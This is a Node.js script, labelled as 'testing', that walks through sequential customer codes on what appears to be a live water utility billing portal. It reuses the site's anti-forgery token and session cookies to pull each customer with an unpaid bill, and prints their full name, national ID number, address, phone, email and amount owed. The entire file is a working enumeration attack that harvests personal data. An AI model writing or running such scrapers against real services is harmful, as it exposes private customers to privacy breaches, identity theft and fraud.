/**
 * Script de testeo con datos completos
 * Obtiene: nombre, direccion, cedula, correo, telefono, deuda
 */

const https = require('https');

const API_BASE_URL = 'ws.suiteneptuno.com';
const API_PATH = '/BarrancaAguasWeb/';

// Configuracion
const CODIGO_INICIO = 26100;
const CODIGO_FIN = 26150;
const DELAY_MS = 1000;

let facturas = [];

console.log('============================================');
console.log('  TESTEO CON DATOS COMPLETOS');
console.log('============================================');
console.log(`  Rango: ${CODIGO_INICIO.toString().padStart(6, '0')} - ${CODIGO_FIN.toString().padStart(6, '0')}`);
console.log('============================================\n');

async function getToken() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: API_BASE_URL,
            path: API_PATH,
            method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0' }
        };

        const req = https.request(options, (res) => {
            let data = '';
            const cookies = res.headers['set-cookie'] || [];
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const tokenMatch = data.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
                const token = tokenMatch ? tokenMatch[1] : null;
                const cookieString = cookies.map(c => c.split(';')[0]).join('; ');
                resolve({ token, cookies: cookieString });
            });
        });
        req.on('error', reject);
        req.end();
    });
}

async function consultarFactura(codigo, token, cookies) {
    return new Promise((resolve) => {
        const postData = `codigoUsuario=${encodeURIComponent(codigo)}&__RequestVerificationToken=${encodeURIComponent(token)}`;

        const options = {
            hostname: API_BASE_URL,
            path: `${API_PATH}?handler=ConsultarFactura`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            const newCookies = res.headers['set-cookie'] || [];
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    let updatedCookies = cookies;
                    if (newCookies.length > 0) {
                        const newCookieStr = newCookies.map(c => c.split(';')[0]).join('; ');
                        updatedCookies = cookies + '; ' + newCookieStr;
                    }
                    resolve({ data: JSON.parse(data), cookies: updatedCookies });
                } catch (e) {
                    resolve({ data: null, cookies });
                }
            });
        });

        req.on('error', () => resolve({ data: null, cookies }));
        req.write(postData);
        req.end();
    });
}

async function obtenerDatosUsuario(cookies) {
    return new Promise((resolve) => {
        const options = {
            hostname: API_BASE_URL,
            path: '/BarrancaAguasWeb/FormPages/FormFactura?handler=CargarDatosUsuario',
            method: 'GET',
            headers: {
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.end();
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function formatMoney(valor) {
    return '$' + Number(valor).toLocaleString('es-CO');
}

async function main() {
    try {
        console.log('Obteniendo token...\n');
        const { token, cookies } = await getToken();

        if (!token) {
            console.log('ERROR: No se pudo obtener el token');
            return;
        }

        for (let i = CODIGO_INICIO; i <= CODIGO_FIN; i++) {
            const codigo = i.toString().padStart(6, '0');

            const resultado = await consultarFactura(codigo, token, cookies);

            if (resultado.data && resultado.data.factura && resultado.data.factura.NUMERO > 0) {
                const f = resultado.data.factura;

                if (f.ESTADO === 'P') {
                    // Obtener datos completos del usuario
                    const datosUsuario = await obtenerDatosUsuario(resultado.cookies);

                    const factura = {
                        codigo: codigo,
                        numFactura: f.NUMERO,
                        nombre: datosUsuario?.nombre || f.NOMBRE || 'Sin dato',
                        cedula: datosUsuario?.cedula || 'Sin dato',
                        direccion: datosUsuario?.dir || f.RUTA || 'Sin dato',
                        telefono: datosUsuario?.tel || 'Sin dato',
                        correo: datosUsuario?.correo || 'Sin dato',
                        deuda: f.TOTALAPAGAR || f.SALDO
                    };

                    facturas.push(factura);

                    console.log('--------------------------------------------');
                    console.log(`CODIGO:     ${factura.codigo}`);
                    console.log(`FACTURA:    #${factura.numFactura}`);
                    console.log(`NOMBRE:     ${factura.nombre}`);
                    console.log(`CEDULA:     ${factura.cedula}`);
                    console.log(`DIRECCION:  ${factura.direccion}`);
                    console.log(`TELEFONO:   ${factura.telefono}`);
                    console.log(`CORREO:     ${factura.correo}`);
                    console.log(`DEUDA:      ${formatMoney(factura.deuda)}`);
                    console.log('--------------------------------------------\n');
                } else {
                    console.log(`[${f.ESTADO === 'C' ? 'PAGADA' : f.ESTADO}] ${codigo}`);
                }
            } else {
                process.stdout.write(`[--------] ${codigo}\r`);
            }

            await sleep(DELAY_MS);
        }

        console.log('\n============================================');
        console.log(`  TOTAL FACTURAS PENDIENTES: ${facturas.length}`);
        console.log('============================================\n');

        if (facturas.length > 0) {
            let totalDeuda = facturas.reduce((sum, f) => sum + f.deuda, 0);
            console.log(`DEUDA TOTAL ACUMULADA: ${formatMoney(totalDeuda)}\n`);

            console.log('RESUMEN:');
            console.log('--------');
            facturas.forEach(f => {
                console.log(`${f.codigo} | ${f.nombre.substring(0, 25).padEnd(25)} | ${formatMoney(f.deuda).padStart(15)}`);
            });
        }

    } catch (error) {
        console.error('Error:', error.message);
    }
}

main();
